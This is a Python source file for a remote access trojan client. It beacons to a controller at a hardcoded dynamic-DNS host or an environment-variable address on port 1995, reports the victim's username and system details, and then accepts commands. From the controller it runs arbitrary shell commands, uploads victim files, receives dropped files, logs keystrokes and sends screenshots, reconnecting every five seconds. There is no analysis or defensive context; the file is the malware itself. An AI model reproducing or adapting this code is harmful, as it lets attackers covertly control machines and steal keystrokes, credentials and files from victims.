import socket
import os
from sys import exit
from subprocess import check_output
from pathlib import Path
import platform
from threading import Thread
import pynput
import pyscreeze
from time import sleep

encode_utf = lambda text: str(text).encode('utf-8')
decode_utf = lambda text: text.decode('utf-8')

def info():
    global CONNECTION

def append_to_keylogs(current_key):
    global KEYLOGS
    if current_key == ' Key.backspace ':
        if KEYLOGS:
            KEYLOGS = KEYLOGS[:-1]
    elif current_key:
        KEYLOGS += current_key

def on_press(key):
    try:
        current_key = key.char
    except AttributeError:
        if key == key.space:
            current_key = ' '
        elif key == key.enter:
            current_key = '\n'
        else:
            current_key = ' '+str(key)+' '
    append_to_keylogs(current_key)

def keylogger(action):
    global KEYLOGGER_THREAD
    global KEYLOGS
    global CONNECTION

    if action == 'start' and not KEYLOGGER_THREAD:
        KEYLOGGER_THREAD = pynput.keyboard.Listener(on_press=on_press)
        KEYLOGGER_THREAD.daemon = True
        KEYLOGGER_THREAD.start()
        #with KEYLOGGER_THREAD:
            #KEYLOGGER_THREAD.join()
        CONNECTION.send(encode_utf('Keylogger Started'))
    elif action == 'start' and KEYLOGGER_THREAD:
        CONNECTION.send(encode_utf('Keylogger already running'))
    elif action == 'keylogs':
        CONNECTION.send(encode_utf(KEYLOGS))
        KEYLOGS = ''
    elif action == 'stop' and KEYLOGGER_THREAD:
        #KEYLOGGER_THREAD.stop
        #pynput.keyboard.Listener.stop
        KEYLOGGER_THREAD = False
        CONNECTION.send(encode_utf('Keylogger stopped'))
    else:
        CONNECTION.send(encode_utf('Invalid keylogger command'))

def pull(command):
    """
    Function for copying file from server to client
    """
    global CONNECTION
    file_name = command[1]
    #full_path =  Path(file_name)
    try:
        with open(file_name, 'ab') as file:
            while True:
                raw = CONNECTION.recv(BUFFER)
                file.write(raw)
                if len(raw) < BUFFER:
                    break
            
    except Exception as e:
        print(str(e))
    

def push(command):
    """
    Function for copying file from client to server
    """
    global CONNECTION
    direc = command[1]
    full_path =  Path(direc)
    
    if full_path.is_file():
        file_info = f"{str(full_path)} {os.path.getsize(full_path)}"
        CONNECTION.send(encode_utf(file_info))
        with open(direc, 'rb') as file:
            while True:
                data = file.read(BUFFER)
                CONNECTION.send(data)
                if len(data) < BUFFER:
                    break
    else:
        CONNECTION.send(encode_utf('Error: No such file exists'))

def cmd(command):
    """
    Function for running commands on client
    """
    global CONNECTION
    try:
        result = check_output(command, shell=True)
        result = str(result)
        result = result.lstrip("b'").replace('\\n', '\n').replace('\\r', '\r').rstrip("'")
    except Exception as e:
        result = str(e)
    CONNECTION.send(encode_utf(result))

def dir(command):
    """
    Function for navigating client directories
    """
    global CONNECTION
    
    directory = command[1] if len(command) > 1 else "."

    if "\\" in directory or "/" in directory:
        newdir = Path(directory)
        if Path.is_dir(newdir):
            os.chdir(newdir)
    else:
        newdir = Path.resolve(Path.joinpath(Path.cwd(), directory))
        os.chdir(newdir)
    CONNECTION.send(encode_utf(Path.cwd()))

def screenshot():
    """
    Function for taking screenshots on client
    """
    global CONNECTION
    
    TMP = Path(os.environ['TMP'])
    TMP = Path.joinpath(TMP, 'screenshot.png')
    pyscreeze.screenshot(TMP)
    with open(TMP, 'rb') as file:
        while True:
            data = file.read(BUFFER)
            CONNECTION.send(data)
            if len(data) < BUFFER:
                break

def connectionhandler():
    global CONNECTION
    while True:
        try:
            command = CONNECTION.recv(BUFFER)
            command = decode_utf(command)
            command = command.split(" ")
            if command[0] == 'exit':
                CONNECTION.close();
                print(f'[Disconneted] {HOST}::{PORT}')
                print('Exiting...')
                exit(0)
            elif command[0] == 'cd':
                dir(command)
            elif command[0] == 'pull':
                push(command)
            elif command[0] == 'push':
                pull(command)
            elif command[0] == 'keylogger':
                keylogger(command[1])
            elif command[0] == 'screenshot':
                screenshot()
            else:
                cmd(command)
        except ConnectionResetError:
            print('Connection has been reset')
            print('Exiting...')
            exit(0)
        except KeyboardInterrupt:
            print('Exiting...')
            exit(0)
        except Exception as e:
            print(str(e))
            exit(1)

def connecttoserver():
    HOST = socket.gethostbyname('w34ver.ddns.net')
    CONNECTION = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CONNECTION.connect((HOST, 1995))
    CONNECTION.send(f"{os.getlogin()} {platform.system()} {platform.release()} {Path.cwd()}".encode('utf-8'))
    connectionhandler()

if __name__ == '__main__':
    BUFFER = 1024
    KEYLOGGER_THREAD = False
    KEYLOGS = ""
    HOST = os.getenv('WEAVER_SERVER')
    PORT = 1995
    #HOST = socket.gethostbyname('w34ver.ddns.net')
    
    while True:
        try:
            CONNECTION = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            CONNECTION.connect((HOST, PORT))
            print(f"[Connected] {HOST}::{PORT}")
            CONNECTION.send(f"{os.getlogin()} {platform.system()} {platform.release()} {Path.cwd()}".encode('utf-8'))
            connectionhandler()

        except ConnectionError as e:
            sleep(5)
            pass
        except KeyboardInterrupt:
            print('Exiting...')
            sleep(1)
            exit(0)
        
